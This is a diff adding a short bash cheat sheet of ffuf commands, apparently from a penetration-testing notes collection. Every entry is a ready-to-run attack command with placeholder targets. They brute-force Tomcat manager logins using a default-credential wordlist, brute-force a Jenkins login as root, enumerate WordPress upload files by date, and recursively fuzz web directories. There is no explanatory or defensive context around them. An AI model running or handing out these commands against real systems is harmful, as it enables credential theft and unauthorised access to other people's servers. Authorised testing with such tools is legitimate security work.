@@ -1,0 +1,18 @@
+---
+syntax: bash
+tags: [networking, fuzz, brute]
+---
+# brute force tomcat manager
+ffuf -w /usr/share/wordlists/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt -H 'Authorization: Basic FUZZ' -u 'http://<IP>:<PORT>/manager/html' -rate 16 -ac -replay-proxy http://127.0.0.1:8080
+
+# brute force jenkins as root user
+ffuf -w <password-file> -u "http://<IP>:<PORT>/j_spring_security_check" -rate 10 -X POST -H "Content-Type: application/x-www-form-urlencoded" -d 'j_username=root&j_password=FUZZ&from=&Submit=Sign+in' -c -fr "loginError"
+
+# known file name, wordpress uploaded file fuzz
+seq 2010 2020 | tee years.txt
+seq -w 12 | tee  months.txt
+ffuf -w years.txt:YEAR -w months.txt:MONTH -u "http://<IP>/wp-content/uploads/YEAR/MONTH/<filename>.jpg" -mc 200 -rate 40
+
+# recursive directory fuzz with auto calibrate on, while replaying hits to Burp/Caido proxy
+ffuf -w /usr/share/wordlists/dirb/common.txt -u "http://<IP>/FUZZ" -ac -recursion -recursion-depth 2 -rate 16 -replay-proxy http://127.0.0.1:8080
+
